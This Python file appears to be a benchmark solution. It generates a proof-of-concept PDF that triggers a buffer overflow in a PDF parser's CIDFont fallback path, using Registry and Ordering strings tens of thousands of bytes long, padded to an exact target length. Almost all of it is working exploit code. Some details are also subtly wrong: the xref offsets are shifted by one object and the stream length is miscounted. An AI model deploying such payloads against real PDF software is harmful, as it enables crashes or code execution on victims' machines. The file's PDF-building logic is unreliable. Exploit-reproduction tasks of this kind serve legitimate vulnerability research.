import os
import struct
import tempfile
import subprocess
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is in CIDFont fallback mechanism with buffer overflow
        # Ground-truth length is 80064 bytes
        
        # Create a minimal valid PDF structure with malicious CIDFont entry
        # Format: PDF header + malicious CIDFont dictionary + xref table
        
        # Build the malicious CIDFont dictionary
        # The vulnerability occurs when forming <Registry>-<Ordering> string
        
        # Create extremely long Registry and Ordering strings to trigger overflow
        # Total length needed: 80064 bytes
        # We'll create a PDF with a CIDFont that has very long Registry and Ordering
        
        # Calculate sizes:
        # PDF overhead ≈ 200 bytes
        # Registry + Ordering need to be ~79864 bytes combined
        # With format overhead, make each ~39932 bytes
        
        reg_length = 39900
        ord_length = 39900
        
        # Create the malicious strings
        registry = b"X" * reg_length
        ordering = b"Y" * ord_length
        
        # Build PDF structure
        pdf_parts = []
        
        # PDF header
        pdf_parts.append(b"%PDF-1.4\n")
        
        # Catalog object
        catalog = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        pdf_parts.append(catalog)
        
        # Pages object
        pages = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        pdf_parts.append(pages)
        
        # Page object
        page = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>\nendobj\n"
        pdf_parts.append(page)
        
        # Content stream
        content = b"4 0 obj\n<< /Length 25 >>\nstream\nBT /F1 12 Tf 72 720 Td (Test) Tj ET\nendstream\nendobj\n"
        pdf_parts.append(content)
        
        # Font object (Type 0 font referencing CIDFont)
        font = b"5 0 obj\n<< /Type /Font /Subtype /Type0 /BaseFont /AAAAAA+Test /Encoding /Identity-H /DescendantFonts [6 0 R] >>\nendobj\n"
        pdf_parts.append(font)
        
        # Malicious CIDFont object - this triggers the vulnerability
        cidfont = b"6 0 obj\n<<\n/Type /Font\n/Subtype /CIDFontType0\n/BaseFont /TestFont\n"
        cidfont += b"/CIDSystemInfo <<\n"
        cidfont += b"/Registry (" + registry + b")\n"
        cidfont += b"/Ordering (" + ordering + b")\n"
        cidfont += b"/Supplement 0\n>>\n"
        cidfont += b"/FontDescriptor 7 0 R\n"
        cidfont += b"/DW 1000\n"
        cidfont += b"/W [0 1000]\n"
        cidfont += b">>\nendobj\n"
        pdf_parts.append(cidfont)
        
        # Font descriptor
        fontdesc = b"7 0 obj\n<< /Type /FontDescriptor /FontName /TestFont /Flags 4 /FontBBox [0 0 1000 1000] /ItalicAngle 0 /Ascent 800 /Descent -200 /CapHeight 700 /StemV 80 >>\nendobj\n"
        pdf_parts.append(fontdesc)
        
        # Calculate offsets for xref table
        offsets = []
        current_offset = 0
        
        # Track offsets for each object
        for part in pdf_parts:
            offsets.append(current_offset)
            current_offset += len(part)
        
        # Build xref table
        xref = b"xref\n"
        xref += b"0 8\n"
        xref += b"0000000000 65535 f \n"
        
        for i in range(1, 8):
            offset = offsets[i-1]
            xref += f"{offset:010d} 00000 n \n".encode()
        
        # Build trailer
        trailer = b"trailer\n"
        trailer += b"<< /Size 8 /Root 1 0 R >>\n"
        trailer += b"startxref\n"
        trailer += f"{offsets[-1] + len(pdf_parts[-1])}\n".encode()
        trailer += b"%%EOF"
        
        pdf_parts.append(xref)
        pdf_parts.append(trailer)
        
        # Combine all parts
        poc = b"".join(pdf_parts)
        
        # Ensure exact length of 80064 bytes
        if len(poc) > 80064:
            # Truncate if too long (shouldn't happen with our calculations)
            poc = poc[:80064]
        elif len(poc) < 80064:
            # Pad with null bytes if too short
            poc += b"\x00" * (80064 - len(poc))
        
        return poc
